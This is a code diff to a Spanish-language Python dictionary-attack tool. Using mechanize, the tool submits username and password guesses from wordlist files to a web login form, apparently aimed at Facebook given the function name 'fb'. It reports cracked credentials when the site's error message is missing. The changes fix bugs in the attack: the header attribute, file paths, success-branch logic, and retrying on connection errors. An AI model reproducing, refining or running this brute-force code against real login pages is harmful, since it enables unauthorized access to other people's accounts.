@@ -12,7 +12,7 @@ esperando = False
 
 def generador(diccionario):
     
-    with open(f'diccionarios/{diccionario}','r') as arch:
+    with open(diccionario,'r') as arch:
         try:
             for linea in arch:
             
@@ -28,7 +28,7 @@ def generador(diccionario):
 
 def leer_dic(nombre):
     try:
-        with open(f'diccionarios/{nombre}','r') as arch:
+        with open(nombre,'r') as arch:
             return str(arch.read()).strip()
         
     except UnicodeDecodeError as e:
@@ -54,7 +54,7 @@ def fb(url_login,usuario,c_usuario,c_contr,contr_,n):
         ]
 
         web.set_handle_robots(False)
-        web.addhandlers = encabezado
+        web.addheaders = encabezado
         sitio = web.open(url_login)
 
         if sitio.code == 200:
@@ -67,28 +67,25 @@ def fb(url_login,usuario,c_usuario,c_contr,contr_,n):
             html = pag2.get_data().decode()
                 
             #si conozco el usuario
-            if search(params.param.msg,html) == None and params.param.usuario != None:
-                print(Fore.GREEN+f'\ncontraseña encontrada: {contr_}\n')
+            if search(params.param.msg,html) == None:
+                if params.param.usuario != None:
+                    print(Fore.GREEN+f'\ncontraseña encontrada: {contr_}\n')
+                else:
+                    print(Fore.GREEN+f'\n cuenta encontrada:\n\n usuario:{usuario}\n contraseña:{contr_}\n')
                 deteniendo = True
 
                 exit()
-
-            elif search(params.param.msg,html) == None and params.param.dic_u != None:
-                print(Fore.GREEN+f'\n cuenta encontrada:\n\n usuario:{usuario}\n contraseña:{contr_}\n')
-
-                deteniendo = True
-                exit()
-
             else:
                 if not deteniendo:
                     print(Fore.RED+f'valor invalido para: {usuario} ,{contr_}')
+                    
         else:
             print(Fore.RED+'el sitio es inaccesible')    
                 
 
 
         web.close()
-    except mechanize.HTTPError:
+    except (mechanize.HTTPError, mechanize.URLError):
         esperando = True
         print(Fore.WHITE+'reconectando...')
         sleep(1)
